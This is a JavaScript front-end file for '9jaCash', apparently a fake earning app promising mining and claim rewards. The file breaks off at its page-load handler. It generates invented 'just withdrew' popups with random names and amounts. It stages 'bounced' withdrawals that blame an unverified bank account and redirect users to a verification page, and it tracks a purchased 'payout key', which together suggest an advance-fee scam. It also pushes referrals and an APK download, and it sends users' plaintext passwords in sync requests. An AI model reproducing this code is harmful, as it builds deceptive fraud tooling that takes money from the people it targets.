// script.js
let userData = null;
let realtimeUnsubscribe = null;

function formatExternalLink(url, defaultUrl) {
  if (!url || typeof url !== 'string' || !url.trim()) return defaultUrl;
  let clean = url.trim().replace(/^\/+/, '');
  if (/^(https?:\/\/|tg:\/\/|whatsapp:\/\/)/i.test(clean)) return clean;
  if (/^(t\.me|wa\.me|whatsapp\.com|telegram\.me)/i.test(clean)) return 'https://' + clean;
  if (/^\+?\d+$/.test(clean)) return 'https://wa.me/' + clean.replace(/^\+/, '');
  if (/^@?[a-zA-Z0-9_]+$/.test(clean)) {
    let username = clean.startsWith('@') ? clean.slice(1) : clean;
    return 'https://t.me/' + username;
  }
  return 'https://' + clean;
}

let isBouncing = false;
try { userData = JSON.parse(localStorage.getItem("9jaCashUser")); } catch (e) { userData = null; }
const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:') ? 'http://localhost:3000' : '';
if (!userData) { window.location.href = "login.html"; }

let balance = (userData ? parseFloat(userData.balance) : 0) || parseFloat(localStorage.getItem("walletBalance")) || 0;
let balanceHidden = false;
const CHECKIN_REWARDS = [500, 1000, 1500, 2000, 3000, 5000, 10000];
let checkinData = JSON.parse(localStorage.getItem("checkinData")) || { streak: 0, lastCheckin: null, claimedDays: [] };
const CLAIM_AMOUNT = 2000;
const CLAIM_INTERVAL = 60;
const MAX_CLAIMS_PER_DAY = 50;
let claimData = JSON.parse(localStorage.getItem("claimData")) || { count: 0, lastClaim: 0, dateStr: "", claimsToday: 0 };
let claimTimer = null;
let secondsLeft = CLAIM_INTERVAL;
let telegramLink = "https://t.me/apex_customercare";

const TUTORIAL_STEPS = [
  { id: "mineBtn", title: "Start Mining", desc: "Tap the Mine button to earn your first ₦30,000. Mining runs daily!", position: "bottom" },
  { id: "withdrawBtn", title: "Withdraw Cash", desc: "Tap Withdraw to cash out your earnings to your linked bank account.", position: "bottom" },
  { id: "tasksBtn", title: "Complete Tasks", desc: "Visit the Tasks page to earn extra cash by completing simple social media tasks.", position: "bottom" },
  { id: "eyeBtn", title: "Hide Balance", desc: "Tap the eye icon anytime to hide or show your balance for privacy.", position: "bottom" },
  { id: "claimArea", title: "Claim Every Minute", desc: "Tap Claim every 60 seconds to collect ₦2,000 free cash! Up to 50 times daily.", position: "top" },
  { id: "checkinBtn", title: "Daily Check-In", desc: "Check in every day to collect increasing rewards: 500, 1K, 1.5K, 2K, 3K, 5K, 10K!", position: "top" }
];
let currentTutorialStep = 0;
let tutorialActive = false;
let db = null;
let auth = null;

// Initialize Firebase from global instance or firebase.js
function initFirebase() {
  try {
    if (typeof firebase !== 'undefined' && firebase.apps && firebase.apps.length > 0) {
      db = firebase.firestore();
      try { db.settings({ experimentalForceLongPolling: true }); } catch (e) { }
      auth = firebase.auth();
      return true;
    }
    if (typeof window.db !== 'undefined') {
      db = window.db;
      auth = window.auth;
      return true;
    }
  } catch (e) { console.error("Firebase init error:", e); }
  return false;
}

// REAL-TIME FIRESTORE LISTENER
function setupRealtimeListener() {
  if (!db || !userData || !userData.phone) return;

  const docRef = db.collection("users").doc(String(userData.phone));

  if (realtimeUnsubscribe) realtimeUnsubscribe();

  realtimeUnsubscribe = docRef.onSnapshot((doc) => {
    if (doc.exists) {
      const liveData = doc.data();

      // Merge Firestore document into memory and localStorage
      userData = { ...userData, ...liveData };
      if (liveData.balance !== undefined && !isBouncing) {
        balance = parseFloat(liveData.balance);
      }

      localStorage.setItem("9jaCashUser", JSON.stringify(userData));
      localStorage.setItem("walletBalance", balance);

      if (liveData.streak !== undefined) checkinData.streak = liveData.streak;
      if (liveData.lastCheckin) checkinData.lastCheckin = liveData.lastCheckin;
      if (liveData.claimedDays) checkinData.claimedDays = liveData.claimedDays;
      localStorage.setItem("checkinData", JSON.stringify(checkinData));

      // Synchronize UI
      renderUserInfo();
      renderBankInfo();
      updateBalance();
      initCheckin();
      initReferrals();
      checkAndShowVerifyButton();
    }
  }, (error) => {
    console.error("Real-time snapshot error:", error);
  });
}

// REAL-TIME SAVE TO FIREBASE & LOCAL STORAGE
function saveUserData(updatedFields = {}) {
  localStorage.setItem("9jaCashUser", JSON.stringify(userData));
  localStorage.setItem("walletBalance", balance);
  updateBalance();

  if (db && userData && userData.phone) {
    const payload = {
      balance: balance,
      totalMined: userData.totalMined || 0,
      miningPower: userData.miningPower || "1x",
      streak: checkinData.streak || 0,
      lastCheckin: checkinData.lastCheckin || null,
      claimedDays: checkinData.claimedDays || [],
      bankName: userData.bankName || "",
      accountNumber: userData.accountNumber || "",
      accountName: userData.accountName || "",
      updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
      ...updatedFields
    };

    db.collection("users").doc(String(userData.phone)).set(payload, { merge: true })
      .then(() => console.log("Real-time data synced to Firebase."))
      .catch((err) => console.error("Firebase sync error:", err));
  }

  if (API_URL && userData && userData.phone) {
    fetch(API_URL + '/api/user/update-balance', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone: userData.phone,
        password: userData.password,
        balance: balance,
        totalMined: userData.totalMined || 0
      })
    }).catch(err => console.error("SQL sync error:", err));
  }
}

// Social popup handles come from Firestore settings/payment (telegramLink, whatsappLink)
let paymentHandles = { telegram: "", whatsapp: "" };
try {
  const cachedPayment = JSON.parse(localStorage.getItem("9jaCashAdminConfig"));
  if (cachedPayment) paymentHandles = { telegram: cachedPayment.telegramLink || "", whatsapp: cachedPayment.whatsappLink || "" };
} catch (e) { }

function loadTelegramConfig() {
  const stored = localStorage.getItem("9jaCashAdminConfig");
  if (stored) { try { const config = JSON.parse(stored); if (config.telegramLink) telegramLink = config.telegramLink; } catch (e) { } }
  if (db) {
    db.collection("settings").doc("payment").onSnapshot(function (doc) {
      if (doc.exists) {
        const d = doc.data() || {};
        if (d.telegramLink) telegramLink = d.telegramLink;
        paymentHandles = { telegram: d.telegramLink || "", whatsapp: d.whatsappLink || "" };
        localStorage.setItem("9jaCashAdminConfig", JSON.stringify({ telegramLink: telegramLink, whatsappLink: paymentHandles.whatsapp }));
        updateTelegramLink();
        // If the popup is already visible, refresh its link
        const p = document.getElementById("socialJoinPopup");
        if (p && p.classList.contains("show")) renderSocialPopup();
      }
    }, function (err) { });
  }
  updateTelegramLink();
}

function updateTelegramLink() {
  const btn = document.getElementById("telegramSupport");
  if (btn) btn.href = "javascript:void(0)";
}

function initDarkMode() {
  const isDark = localStorage.getItem("9jaCashDark") === "true";
  if (isDark) document.body.classList.add("dark-mode");
}

function toggleDarkMode() {
  const isDark = document.body.classList.toggle("dark-mode");
  localStorage.setItem("9jaCashDark", isDark);
}

function initTutorial() {
  if (localStorage.getItem("9jaCashTutorialDone") === "true") return;
  setTimeout(function () { startTutorial(); }, 1500);
}

function startTutorial() {
  tutorialActive = true; currentTutorialStep = 0;
  document.getElementById("tutorialOverlay").classList.add("active");
  const skipBtn = document.getElementById("skipTourBtn");
  if (skipBtn) skipBtn.classList.add("show");
  const startBtn = document.getElementById("startTourBtn");
  if (startBtn) startBtn.style.display = "none";
  renderTutorialDots(); showTutorialStep(0);
}

function skipTutorial() { finishTutorial(); }

function renderTutorialDots() {
  const wrap = document.getElementById("tutorialProgress");
  wrap.innerHTML = "";
  TUTORIAL_STEPS.forEach(function (s, i) {
    const dot = document.createElement("div");
    dot.className = "tutorial-dot" + (i === 0 ? " active" : "");
    dot.id = "dot" + i; wrap.appendChild(dot);
  });
}

function showTutorialStep(index) {
  if (index >= TUTORIAL_STEPS.length) { finishTutorial(); return; }
  const step = TUTORIAL_STEPS[index];
  const target = document.getElementById(step.id);
  if (!target) { nextTutorial(); return; }
  document.querySelectorAll(".tutorial-glow").forEach(function (el) { el.classList.remove("tutorial-glow"); });
  target.classList.add("tutorial-glow");
  const rect = target.getBoundingClientRect();
  const highlight = document.getElementById("tutorialHighlight");
  const bubble = document.getElementById("tutorialBubble");
  highlight.style.left = (rect.left - 8) + "px";
  highlight.style.top = (rect.top - 8) + "px";
  highlight.style.width = (rect.width + 16) + "px";
  highlight.style.height = (rect.height + 16) + "px";
  document.getElementById("tutorialStepNum").textContent = "Step " + (index + 1) + " of " + TUTORIAL_STEPS.length;
  document.getElementById("tutorialTitle").textContent = step.title;
  document.getElementById("tutorialDesc").textContent = step.desc;
  bubble.className = "tutorial-bubble" + (step.position === "top" ? " top" : "");
  let bubbleTop, bubbleLeft;
  if (step.position === "bottom") { bubbleTop = rect.bottom + 20; } else { bubbleTop = rect.top - 180; }
  bubbleLeft = Math.max(20, Math.min(window.innerWidth - 320, rect.left + rect.width / 2 - 150));
  bubble.style.top = bubbleTop + "px";
  bubble.style.left = bubbleLeft + "px";
  TUTORIAL_STEPS.forEach(function (s, i) {
    const dot = document.getElementById("dot" + i);
    if (dot) dot.className = "tutorial-dot" + (i === index ? " active" : "");
  });
  target.scrollIntoView({ behavior: "smooth", block: "center" });
}

function nextTutorial() {
  const currentStep = TUTORIAL_STEPS[currentTutorialStep];
  if (currentStep) {
    const target = document.getElementById(currentStep.id);
    if (target) target.classList.remove("tutorial-glow");
  }
  currentTutorialStep++; showTutorialStep(currentTutorialStep);
}

function finishTutorial() {
  tutorialActive = false;
  document.getElementById("tutorialOverlay").classList.remove("active");
  document.getElementById("tutorialProgress").innerHTML = "";
  document.querySelectorAll(".tutorial-glow").forEach(function (el) { el.classList.remove("tutorial-glow"); });
  const skipBtn = document.getElementById("skipTourBtn");
  if (skipBtn) skipBtn.classList.remove("show");
  const startBtn = document.getElementById("startTourBtn");
  if (startBtn) startBtn.style.display = "flex";
  localStorage.setItem("9jaCashTutorialDone", "true");
  showToast("Tour complete! Start earning!");
}

function executeBounce() {
  const stored = localStorage.getItem("pendingBounce");
  if (!stored) return;

  isBouncing = true;
  localStorage.removeItem("pendingBounce");

  try {
    const data = JSON.parse(stored);
    const amount = parseFloat(data.amount) || 0;
    if (amount <= 0) { isBouncing = false; return; }

    balance = (parseFloat(localStorage.getItem("walletBalance")) || 0) + amount;
    userData.balance = balance;
    saveUserData();

    addBounceToActivity("Withdrawal Reversed", amount, "Unsuccessful - Linked bank account not verified");
    sendBounceNotification(amount);

    localStorage.setItem("9jaCashBouncedWithdrawal", "true");
    checkAndShowVerifyButton();

    if (typeof Swal !== 'undefined') {
      Swal.fire({
        icon: "warning",
        title: "Withdrawal Failed",
        html: '<p style="color:#64748b;">Your withdrawal of <b>₦' + amount.toLocaleString() + '</b> was returned.</p><p style="color:#64748b;margin-top:8px;">Reason: <b>Linked bank account not verified</b></p>',
        confirmButtonText: "Verify Account",
        confirmButtonColor: "#ef4444"
      }).then(function (r) { if (r.isConfirmed) { verifyBankLink(); } });
    } else {
      alert("Withdrawal Failed\nYour withdrawal of ₦" + amount.toLocaleString() + " was returned.");
      verifyBankLink();
    }
    isBouncing = false;
  } catch (e) {
    console.error("Bounce execution error:", e);
    isBouncing = false;
  }
}

function checkPendingBounceOnLoad() {
  const stored = localStorage.getItem("pendingBounce");
  if (!stored) return;
  try {
    const isUserVer = userData && (userData.is_verified === 1 || userData.is_verified === true || userData.isVerified === true);
    if (isUserVer) {
      localStorage.removeItem("pendingBounce");
      return;
    }
    const data = JSON.parse(stored);
    const elapsed = Date.now() - (data.timestamp || 0);
    const BOUNCE_DELAY = 30000;

    if (elapsed >= BOUNCE_DELAY) executeBounce();
    else setTimeout(executeBounce, BOUNCE_DELAY - elapsed);
  } catch (e) {
    localStorage.removeItem("pendingBounce");
  }
}

function maskNum(num) { if (!num || num.length < 4) return "****"; return "**** " + num.slice(-4); }

function formatMoney(num) { return "₦" + Number(num || 0).toLocaleString("en-NG"); }

function updateBalance() {
  const el = document.getElementById("walletBalance");
  if (!el) return;
  if (balanceHidden) { el.innerHTML = "****<span>.**</span>"; } else {
    const formatted = formatMoney(balance);
    if (formatted.includes(".")) { el.innerHTML = formatted.replace(/\.(\d+)$/, '<span>.$1</span>'); }
    else { el.innerHTML = formatted + '<span>.00</span>'; }
  }
  fitBalance();
}

// Shrinks the balance font so large amounts never overflow the card
function fitBalance() {
  const el = document.getElementById("walletBalance");
  if (!el) return;
  const container = el.parentElement;
  if (!container) return;

  // Reset to the stylesheet's font size before measuring
  el.style.whiteSpace = "nowrap";
  el.style.fontSize = "";

  const cs = getComputedStyle(container);
  const available = container.clientWidth - parseFloat(cs.paddingLeft || 0) - parseFloat(cs.paddingRight || 0);
  if (available <= 0) return; // card not visible yet

  const measure = function () {
    const range = document.createRange();
    range.selectNodeContents(el);
    return range.getBoundingClientRect().width;
  };

  let width = measure();
  if (width <= available) return;

  const baseSize = parseFloat(getComputedStyle(el).fontSize);
  const minSize = 14;
  let size = Math.max(minSize, Math.floor(baseSize * (available / width)));
  el.style.fontSize = size + "px";

  // Fine-tune in case the decimal span isn't scaled proportionally
  let guard = 0;
  while (measure() > available && size > minSize && guard < 40) {
    size -= 1;
    el.style.fontSize = size + "px";
    guard++;
  }
}

window.addEventListener("resize", fitBalance);
if (document.fonts && document.fonts.ready) document.fonts.ready.then(fitBalance);

function toggleBalance() {
  balanceHidden = !balanceHidden;
  const icon = document.getElementById("eyeIcon");
  if (icon) icon.className = balanceHidden ? "fa-regular fa-eye-slash" : "fa-regular fa-eye";
  updateBalance();
}

function showToast(msg) {
  const t = document.getElementById("toast");
  if (!t) return;
  document.getElementById("toastMsg").textContent = msg;
  t.classList.add("show");
  setTimeout(function () { t.classList.remove("show"); }, 2500);
}

function renderUserInfo() {
  if (!userData) return;
  const nameEl = document.getElementById("userName");
  const avatarEl = document.getElementById("userAvatar");
  const greetingEl = document.getElementById("greeting");

  if (nameEl) nameEl.textContent = userData.name || userData.phone || "9jaCash User";
  if (avatarEl) avatarEl.textContent = (userData.name || userData.phone || "9").charAt(0).toUpperCase();

  const hrs = new Date().getHours();
  let greet = "Good morning";
  if (hrs >= 12 && hrs < 17) greet = "Good afternoon";
  else if (hrs >= 17) greet = "Good evening";
  if (greetingEl) greetingEl.textContent = greet;

  const totalMinedEl = document.getElementById("totalMined");
  const miningPowerEl = document.getElementById("miningPower");
  if (totalMinedEl) totalMinedEl.textContent = formatMoney(userData.totalMined || 0);
  if (miningPowerEl) miningPowerEl.textContent = userData.miningPower || "1x";
}

function initCheckin() {
  document.getElementById("streakCount").textContent = checkinData.streak || 0;
  for (let i = 0; i < 7; i++) {
    const el = document.getElementById("day" + i);
    if (!el) continue;
    if (i < checkinData.claimedDays.length) { el.className = "checkin-day done"; el.querySelector(".day-num").textContent = "✓"; }
    else if (i === checkinData.claimedDays.length) { el.className = "checkin-day active"; el.querySelector(".day-num").textContent = (i + 1); }
    else { el.className = "checkin-day locked"; el.querySelector(".day-num").textContent = (i + 1); }
  }
  const btn = document.getElementById("checkinBtn");
  const todayStr = new Date().toDateString();
  if (checkinData.lastCheckin === todayStr) {
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-check"></i> Checked In Today';
  }
}

function doCheckin() {
  const todayStr = new Date().toDateString();
  if (checkinData.lastCheckin === todayStr) { showToast("Already checked in today!"); return; }
  const dayIndex = checkinData.claimedDays.length;
  const amount = CHECKIN_REWARDS[Math.min(dayIndex, 6)];

  balance += amount;
  userData.balance = balance;
  userData.totalMined = (userData.totalMined || 0) + amount;
  checkinData.claimedDays.push(todayStr);
  checkinData.lastCheckin = todayStr;
  checkinData.streak = (checkinData.streak || 0) + 1;

  if (checkinData.claimedDays.length > 7) checkinData.claimedDays = [];
  localStorage.setItem("checkinData", JSON.stringify(checkinData));

  saveUserData({ streak: checkinData.streak });
  addToActivity("Daily Check-In", amount, "in");
  initCheckin();

  if (typeof Swal !== 'undefined') {
    Swal.fire({
      icon: "success",
      title: "Day " + checkinData.claimedDays.length + " Complete!",
      text: "+₦" + amount.toLocaleString() + " added to your balance",
      confirmButtonColor: "#6366f1"
    });
  } else {
    showToast("Checked in! +₦" + amount.toLocaleString());
  }
}


// ---------- Mining cooldown ----------
const MINE_AMOUNT = 30000;
const MINE_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24 hours
let isMining = false;

// Turns anything stored for "last mined" into epoch milliseconds.
function toMillis(v) {
  if (!v) return 0;
  if (typeof v === "number") return isFinite(v) ? v : 0;
  if (typeof v === "string") {
    if (/^\d{10,}$/.test(v)) return Number(v);
    const t = new Date(v).getTime();
    return isNaN(t) ? 0 : t;
  }
  if (typeof v === "object") {
    if (typeof v.toMillis === "function") return v.toMillis();
    if (typeof v.toDate === "function") return v.toDate().getTime();
    if (typeof v.seconds === "number") return v.seconds * 1000 + Math.floor((v.nanoseconds || 0) / 1e6);
  }
  return 0;
}

function mineKey() { return "9jaCashLastMine_" + String((userData && userData.phone) || ""); }
function getLocalLastMine() { try { return toMillis(localStorage.getItem(mineKey())); } catch (e) { return 0; } }

async function startMining() {
  if (isMining) return;
  isMining = true;

  const showCooldown = function (lastMine) {
    const remainingMs = MINE_COOLDOWN_MS - (Date.now() - lastMine);
    const hours = Math.max(0, Math.floor(remainingMs / (1000 * 60 * 60)));
    const minutes = Math.max(0, Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60)));
    if (typeof Swal !== 'undefined') {
      Swal.fire({
        icon: 'warning',
        title: 'Already Mined Today!',
        text: `You can only mine once every 24 hours. Please wait ${hours}h ${minutes}m before mining again.`,
        confirmButtonColor: '#6366f1'
      });
    } else {
      showToast(`Already mined! Wait ${hours}h ${minutes}m.`);
    }
  };

  try {
    // 1. Local cooldown check
    const localLast = Math.max(toMillis(userData && userData.lastMineTime), getLocalLastMine());
    if (Date.now() - localLast < MINE_COOLDOWN_MS) { showCooldown(localLast); return; }

    let newBalance, newTotal;
    const mineTime = Date.now();

    // 2. Server-side check + write in one transaction
    if (db && userData && userData.phone) {
      const ref = db.collection("users").doc(String(userData.phone));
      let outcome;
      try {
        outcome = await db.runTransaction(async function (tx) {
          const snap = await tx.get(ref);
          const d = snap.exists ? snap.data() : {};
          const serverLast = toMillis(d.lastMineTime);
          if (Date.now() - Math.max(serverLast, localLast) < MINE_COOLDOWN_MS) {
            return { ok: false, last: Math.max(serverLast, localLast) };
          }
          const base = d.balance !== undefined ? parseFloat(d.balance) || 0 : balance;
          const total = (parseFloat(d.totalMined) || 0) + MINE_AMOUNT;
          const nb = base + MINE_AMOUNT;
          tx.set(ref, {
            balance: nb,
            totalMined: total,
            lastMineTime: firebase.firestore.FieldValue.serverTimestamp(),
            updatedAt: firebase.firestore.FieldValue.serverTimestamp()
          }, { merge: true });
          return { ok: true, balance: nb, totalMined: total };
        });
      } catch (err) {
        console.error("Mining transaction failed:", err);
        showToast("Couldn't reach the server. Check your connection and try again.");
        return;
      }

      if (!outcome.ok) {
        try { localStorage.setItem(mineKey(), String(outcome.last)); } catch (e) { }
        userData.lastMineTime = outcome.last;
        showCooldown(outcome.last);
        return;
      }
      newBalance = outcome.balance;
      newTotal = outcome.totalMined;
    } else {
      newBalance = balance + MINE_AMOUNT;
      newTotal = (userData.totalMined || 0) + MINE_AMOUNT;
    }

    // 3. Apply locally
    try { localStorage.setItem(mineKey(), String(mineTime)); } catch (e) { }
    balance = newBalance;
    userData.balance = balance;
    userData.totalMined = newTotal;
    userData.lastMineTime = mineTime;
    localStorage.setItem("9jaCashUser", JSON.stringify(userData));
    localStorage.setItem("walletBalance", balance);
    updateBalance();
    if (!(db && userData.phone)) saveUserData({ totalMined: userData.totalMined });
    addToActivity("Daily Mining Reward", MINE_AMOUNT, "in");

    if (typeof Swal !== 'undefined') {
      Swal.fire({
        icon: 'success',
        title: 'Mining Successful!',
        text: 'You mined ₦' + MINE_AMOUNT.toLocaleString() + ' today! Come back in 24 hours.',
        confirmButtonColor: '#6366f1'
      });
    } else {
      showToast("Mined +₦" + MINE_AMOUNT.toLocaleString());
    }
  } finally {
    isMining = false;
  }
}

function renderBankInfo() {
  const bankNameText = document.getElementById("bankNameText");
  const bankMeta = document.getElementById("bankMeta");
  if (bankNameText) bankNameText.textContent = userData.bankName || "No Bank Linked";
  if (bankMeta) bankMeta.textContent = (userData.accountNumber ? maskNum(userData.accountNumber) : "****") + " | " + (userData.accountName || "Not Set");
}

function checkAndShowVerifyButton() {
  const wrap = document.getElementById("verifyBankWrap");
  if (!wrap) return;
  const isBounced = localStorage.getItem("9jaCashBouncedWithdrawal") === "true";
  const hasPayoutKey = userData && userData.payoutKeyPurchased === true;
  const isVerified = userData && (userData.is_verified === 1 || userData.is_verified === true || userData.isVerified === true);

  if ((isBounced || hasPayoutKey) && !isVerified) wrap.classList.add("show");
  else wrap.classList.remove("show");
}

function handleVerifyClick() {
  const videoBanner = document.getElementById("verifyTutorialBanner");
  if (videoBanner) videoBanner.style.display = "block";
  openVerificationVideoModal();
}

function openVerificationVideoModal() {
  const modal = document.getElementById("verificationVideoModal");
  if (modal) modal.style.display = "flex";
}

function skipVerificationVideo() {
  const modal = document.getElementById("verificationVideoModal");
  if (modal) modal.style.display = "none";
  verifyBankLink();
}

function proceedToVerify() {
  const modal = document.getElementById("verificationVideoModal");
  if (modal) modal.style.display = "none";
  verifyBankLink();
}

function verifyBankLink() { window.location.href = "verify.html"; }

function initReferrals() {
  const code = userData ? (userData.referralCode || userData.phone || "9JACASH") : "9JACASH";
  const baseUrl = window.location.origin + window.location.pathname.replace("dashboard.html", "") + "start.html?ref=" + code;

  const input = document.getElementById("referralLinkInput");
  if (input) input.value = baseUrl;

  const countEl = document.getElementById("referralsCountVal");
  const earnEl = document.getElementById("referralEarningsVal");
  if (countEl) countEl.textContent = userData.referralsCount || userData.referrals || 0;
  if (earnEl) earnEl.textContent = formatMoney(userData.referralEarnings || 0);

  const msg = encodeURIComponent("Join me on 9jaCash to earn daily cash! Register here: " + baseUrl);
  const shareTg = document.getElementById("shareTelegram");
  if (shareTg) shareTg.href = "https://t.me/share/url?url=" + encodeURIComponent(baseUrl) + "&text=" + msg;
  const shareWa = document.getElementById("shareWhatsApp");
  if (shareWa) shareWa.href = "https://api.whatsapp.com/send?text=" + msg;
}

function copyReferralLink() {
  const input = document.getElementById("referralLinkInput");
  if (input) {
    input.select();
    navigator.clipboard.writeText(input.value).then(() => showToast("Referral link copied!"));
  }
}

function copyReferralMessage() {
  const input = document.getElementById("referralLinkInput");
  const code = userData ? (userData.referralCode || userData.phone || "9JACASH") : "9JACASH";
  const msg = "Join 9jaCash today & earn daily cash!\nUse referral code: " + code + "\nLink: " + (input ? input.value : "");
  navigator.clipboard.writeText(msg).then(() => showToast("Referral details copied!"));
}

function addToActivity(title, amount, type) {
  let activities = JSON.parse(localStorage.getItem("activities")) || [];
  const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  activities.unshift({ title, amount, type, time: timeStr });
  if (activities.length > 20) activities.pop();
  localStorage.setItem("activities", JSON.stringify(activities));
  renderActivities();
}

function addBounceToActivity(title, amount, status) {
  let activities = JSON.parse(localStorage.getItem("activities")) || [];
  const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  activities.unshift({ title, amount, type: 'bounce', status, time: timeStr });
  if (activities.length > 20) activities.pop();
  localStorage.setItem("activities", JSON.stringify(activities));
  renderActivities();
}

function renderActivities() {
  const list = document.getElementById("activityList");
  if (!list) return;
  let activities = JSON.parse(localStorage.getItem("activities")) || [];
  if (activities.length === 0) {
    list.innerHTML = '<div class="activity-item" style="justify-content:center;padding:20px 0;"><p style="color:#94a3b8;font-size:13px;">No activity yet</p></div>';
    return;
  }
  list.innerHTML = activities.map(act => {
    let iconBg = "#ecfdf5", iconColor = "#10b981", iconClass = "fa-plus", amountClass = "act-amount", sign = "+";
    if (act.type === 'out') {
      iconBg = "#fef2f2"; iconColor = "#ef4444"; iconClass = "fa-minus"; amountClass = "act-amount out"; sign = "-";
    } else if (act.type === 'bounce') {
      iconBg = "#fff7ed"; iconColor = "#f59e0b"; iconClass = "fa-rotate-left"; amountClass = "act-amount bounce"; sign = "↩ ";
    }
    return `
      <div class="activity-item">
        <div class="act-icon ${act.type === 'bounce' ? 'bounce' : ''}" style="background:${iconBg};color:${iconColor};">
          <i class="fa-solid ${iconClass}"></i>
        </div>
        <div class="act-info">
          <div class="act-title">${act.title}</div>
          <div class="act-time">${act.time} ${act.status ? '• ' + act.status : ''}</div>
        </div>
        <div class="${amountClass}">${sign}₦${Number(act.amount).toLocaleString()}</div>
      </div>
    `;
  }).join("");
}

function logout() {
  if (confirm("Are you sure you want to log out?")) {
    if (realtimeUnsubscribe) realtimeUnsubscribe();
    localStorage.removeItem("9jaCashUser");
    localStorage.removeItem("walletBalance");
    window.location.href = "login.html";
  }
}

function sendBounceNotification(amount) {
  if ("Notification" in window && Notification.permission === "granted") {
    new Notification("Withdrawal Returned", { body: "Your ₦" + amount.toLocaleString() + " withdrawal was returned." });
  }
}

function requestNotify() {
  if ("Notification" in window) {
    Notification.requestPermission().then(permission => {
      if (permission === "granted") showToast("Notifications enabled!");
      dismissNotify();
    });
  } else dismissNotify();
}

function dismissNotify() {
  const banner = document.getElementById("notifyBanner");
  if (banner) banner.classList.remove("show");
}

function showDownloadPrompt() {
  const banner = document.getElementById("downloadBanner");
  if (banner) banner.classList.add("show");
}

function dismissDownloadPrompt() {
  const banner = document.getElementById("downloadBanner");
  if (banner) banner.classList.remove("show");
}

const APK_URL = "https://raw.githubusercontent.com/Xantech007/9jaCashMine/main/9jaCash.apk";

function downloadAppAPK() {
  showToast("Downloading APK...");
  dismissDownloadPrompt();
  window.open(APK_URL, "_blank");
}


// ---- Customer Care modal: handles come from Firestore settings/redirects ----
let socialHandles = { telegram: "", whatsapp: "" };
try {
  const cached = JSON.parse(localStorage.getItem("9jaCashSocialHandles"));
  if (cached) socialHandles = { telegram: cached.telegram || "", whatsapp: cached.whatsapp || "" };
} catch (e) { }

function buildTelegramUrl(handle) {
  if (!handle) return "";
  return formatExternalLink(String(handle), "");
}

function buildWhatsappUrl(handle) {
  if (!handle) return "";
  const clean = String(handle).trim();
  if (/^(https?:\/\/|whatsapp:\/\/)/i.test(clean)) return clean;
  const digits = clean.replace(/[^\d]/g, "");
  return digits ? "https://wa.me/" + digits : "";
}

// Customer Care modal: Telegram username / WhatsApp number from settings/redirects
function updateCustomerCareLinks() {
  const tg = document.getElementById("modalTelegramBtn");
  const wa = document.getElementById("modalWhatsappBtn");
  const tgUrl = buildTelegramUrl(socialHandles.telegram);
  const waUrl = buildWhatsappUrl(socialHandles.whatsapp);
  if (tg && tgUrl) tg.href = tgUrl;
  if (wa && waUrl) {
    wa.href = waUrl + (waUrl.indexOf("?") === -1 ? "?text=" + encodeURIComponent("Hello 9jaCash Support, I need assistance") : "");
  }
}

function loadSocialHandles() {
  if (!db) return;
  db.collection("settings").doc("redirects").onSnapshot(function (doc) {
    if (!doc.exists) return;
    const d = doc.data() || {};
    socialHandles = {
      telegram: d.failedSupportHandle || "",
      whatsapp: d.whatsappHandle || ""
    };
    try { localStorage.setItem("9jaCashSocialHandles", JSON.stringify(socialHandles)); } catch (e) { }
    updateCustomerCareLinks();
  }, function (err) { });
}

// Alternates Telegram / WhatsApp on each page load; falls back to whichever exists
function pickSocialPlatform() {
  const tg = buildTelegramUrl(paymentHandles.telegram);
  const wa = buildWhatsappUrl(paymentHandles.whatsapp);
  if (tg && wa) return window.__socialPlatform || "telegram";
  if (wa) return "whatsapp";
  if (tg) return "telegram";
  return "";
}

function renderSocialPopup() {
  const platform = pickSocialPlatform();
  if (!platform) return false;

  const isWa = platform === "whatsapp";
  const url = isWa ? buildWhatsappUrl(paymentHandles.whatsapp) : buildTelegramUrl(paymentHandles.telegram);
  const iconClass = isWa ? "fa-whatsapp" : "fa-telegram";

  const icon = document.getElementById("socialPopupIcon");
  const title = document.getElementById("socialPopupTitle");
  const btn = document.getElementById("socialPopupBtn");

  if (icon) {
    icon.classList.remove("telegram", "whatsapp");
    icon.classList.add(platform);
    icon.innerHTML = '<i class="fa-brands ' + iconClass + '"></i>';
  }
  if (title) title.textContent = isWa ? "📢 Join Our WhatsApp Community" : "📢 Join Our Telegram Channel";
  if (btn) {
    btn.classList.remove("telegram", "whatsapp");
    btn.classList.add(platform);
    btn.href = url;
    btn.innerHTML = '<i class="fa-brands ' + iconClass + '"></i> Join Now';
    btn.onclick = function () { dismissSocialPopup(); };
  }
  return true;
}

function showSocialPopup() {
  const p = document.getElementById("socialJoinPopup");
  if (!p) return;
  if (!renderSocialPopup()) return; // no handles available, keep hidden
  p.classList.add("show");
}

function dismissSocialPopup() {
  const p = document.getElementById("socialJoinPopup");
  if (p) p.classList.remove("show");
}

function initSocialPopup() {
  // Alternate platform each page load
  let last = "whatsapp";
  try { last = localStorage.getItem("9jaCashLastSocial") || "whatsapp"; } catch (e) { }
  window.__socialPlatform = last === "telegram" ? "whatsapp" : "telegram";
  try { localStorage.setItem("9jaCashLastSocial", window.__socialPlatform); } catch (e) { }

  updateCustomerCareLinks(); // apply cached handles immediately
  loadSocialHandles();
  // Show the popup 3 seconds after every page load
  setTimeout(showSocialPopup, 3000);
}

function startLiveWithdrawalPopups() {
  const users = ["Musa B.", "Chidi O.", "Amina Y.", "Efe P.", "Blessing K."];
  const amounts = [15000, 25000, 30000, 50000, 20000];

  setInterval(() => {
    const popup = document.getElementById("liveWithdrawalPopup");
    if (!popup) return;

    const user = users[Math.floor(Math.random() * users.length)];
    const amt = amounts[Math.floor(Math.random() * amounts.length)];

    document.getElementById("liveWithdrawalAvatar").textContent = user.charAt(0);
    document.getElementById("liveWithdrawalUser").textContent = user;
    document.getElementById("liveWithdrawalAction").textContent = "just withdrew " + formatMoney(amt);

    popup.style.opacity = "1";
    popup.style.transform = "translate(-50%, 0)";

    setTimeout(() => {
      popup.style.opacity = "0";
      popup.style.transform = "translate(-50%, -150px)";
    }, 4000);
  }, 18000);
}

document.addEventListener("DOMContentLoaded", function () {
